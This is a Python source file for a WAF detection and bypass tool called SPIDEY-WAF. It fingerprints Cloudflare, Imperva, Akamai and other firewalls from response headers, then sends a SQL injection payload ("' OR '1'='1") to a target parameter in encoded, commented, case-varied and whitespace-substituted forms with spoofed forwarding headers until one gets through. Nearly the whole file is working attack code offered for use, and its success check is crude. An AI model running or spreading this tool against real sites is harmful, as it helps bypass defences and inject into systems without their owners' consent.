#!/usr/bin/env python3
"""
SPIDEY-WAF - Advanced WAF Detection and Bypass Module
Bypasses Cloudflare, Imperva, ModSecurity, F5, Akamai, and more
"""

import requests
import os
from concurrent.futures import ThreadPoolExecutor

R, G, Y, B, C = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m'
X = '\033[0m'

def print_banner():
    """Print ASCII banner"""
    banner_path = os.path.join(os.path.dirname(__file__), 'b.txt')
    try:
        with open(banner_path, 'r') as f:
            print(f.read())
    except:
        pass

class WAFDetector:
    """Detect WAF from HTTP responses"""
    
    SIGNATURES = {
        'Cloudflare': ['cf-ray', 'cloudflare', 'cf_clearance'],
        'Imperva': ['imperva', 'incapsula', 'x-iinfo'],
        'ModSecurity': ['mod_security', 'modsecurity'],
        'F5': ['f5', 'bigip', 'x-forwarded-for'],
        'Akamai': ['akamai', 'x-akamai'],
        'Sucuri': ['sucuri', 'cloudproxy'],
        'Barracuda': ['barracuda', 'barra'],
        'DDoS-GUARD': ['ddos-guard'],
        'AWS WAF': ['aws-waf', 'amazon'],
    }
    
    @staticmethod
    def detect(url, timeout=5):
        """Detect WAF protecting target"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'X-Forwarded-For': '1.1.1.1',
            }
            r = requests.get(url, headers=headers, timeout=timeout, verify=False)
            
            detected = []
            for waf, sigs in WAFDetector.SIGNATURES.items():
                for sig in sigs:
                    for header, value in r.headers.items():
                        if sig.lower() in (header.lower() + str(value).lower()):
                            detected.append(waf)
            
            if detected:
                print(f"{Y}[!] WAF Detected: {', '.join(set(detected))}{X}")
                return list(set(detected))
            else:
                print(f"{G}[+] No WAF detected{X}")
                return []
        except Exception as e:
            print(f"{R}[-] Error: {e}{X}")
            return []

class WAFBypass:
    """WAF bypass techniques"""
    
    # Encoding techniques
    ENCODINGS = {
        'hex': lambda p: '0x' + p.encode().hex(),
        'url': lambda p: p.replace(' ', '%20').replace("'", '%27'),
        'double_url': lambda p: p.replace('%', '%25'),
        'unicode': lambda p: ''.join(f'%u{ord(c):04x}' for c in p),
        'html': lambda p: ''.join(f'&#{ord(c)};' for c in p),
    }
    
    # Header-based bypasses
    HEADERS = {
        'X-Original-URL': '/index.php?id=1',
        'X-Rewrite-URL': '/index.php?id=1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-Proto': 'https',
        'X-HTTP-Method-Override': 'GET',
        'X-Requested-With': 'XMLHttpRequest',
        'Client-IP': '127.0.0.1',
    }
    
    # Comment bypass techniques
    COMMENTS = [
        '--', '#', '/*', '/*! */', '-- -a', '-- +',
        '/**/', '/*!50000*/', '/*!40000*/', ';%00',
    ]
    
    # Space bypass techniques
    SPACES = [
        ' ', '/**/', '\t', '\n', '\r', '%09', '%0a', '%0d', 
        '%20', '()', '+', '~', '%2b',
    ]
    
    # Case variation
    @staticmethod
    def case_variation(payload):
        variations = [
            payload,
            payload.upper(),
            payload.lower(),
        ]
        return variations
    
    # Null byte injection
    @staticmethod
    def null_byte(payload):
        return payload + '\x00'
    
    # Comment injection
    @staticmethod
    def comment_inject(payload):
        return payload + WAFBypass.COMMENTS[0]
    
    # Generate bypass payloads
    @staticmethod
    def generate_bypasses(base_payload):
        bypasses = []
        
        # Base encodings
        for encoding, func in WAFBypass.ENCODINGS.items():
            try:
                bypasses.append(func(base_payload))
            except:
                pass
        
        # Case variations
        bypasses.extend(WAFBypass.case_variation(base_payload))
        
        # Comment injections
        for comment in WAFBypass.COMMENTS[:3]:
            bypasses.append(base_payload + ' ' + comment)
        
        # Space bypasses
        for space in WAFBypass.SPACES[:3]:
            bypasses.append(base_payload.replace(' ', space))
        
        return bypasses

class BypassTester:
    """Test bypass techniques"""
    
    def __init__(self, url, timeout=10):
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
    
    def test_bypass(self, param, payload, method='GET'):
        """Test if bypass works"""
        try:
            if method == 'GET':
                r = self.session.get(self.url, params={param: payload}, timeout=self.timeout)
            else:
                r = self.session.post(self.url, data={param: payload}, timeout=self.timeout)
            
            # Simple check: if no 403/406, bypass may work
            if r.status_code not in [403, 406, 429]:
                return True
            return False
        except:
            return False
    
    def find_working_bypass(self, param, base_payload):
        """Find working bypass technique"""
        print(f"{C}[*] Testing bypass techniques...{X}")
        
        bypasses = WAFBypass.generate_bypasses(base_payload)
        
        for i, bypass in enumerate(bypasses):
            if self.test_bypass(param, bypass):
                print(f"{G}[+] Working bypass found!{X}")
                print(f"    Technique: {bypass[:60]}...")
                return bypass
        
        print(f"{R}[-] No working bypass found{X}")
        return None

def main():
    import argparse
    
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='SPIDEY-WAF - WAF Detection and Bypass Tool'
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', help='Parameter to bypass')
    parser.add_argument('-d', '--detect-only', action='store_true', help='Only detect WAF')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout')
    
    args = parser.parse_args()
    
    print(f"""
{C}╔════════════════════════════════════════════════════════════════════╗{X}
{C}║          SPIDEY-WAF - WAF Bypass Tool                              ║{X}
{C}╚════════════════════════════════════════════════════════════════════╝{X}
    """)
    
    # Detect WAF
    WAFDetector.detect(args.url, args.timeout)
    
    # Test bypass if parameter provided
    if args.param and not args.detect_only:
        tester = BypassTester(args.url, args.timeout)
        base = "' OR '1'='1"
        tester.find_working_bypass(args.param, base)

if __name__ == '__main__':
    main()
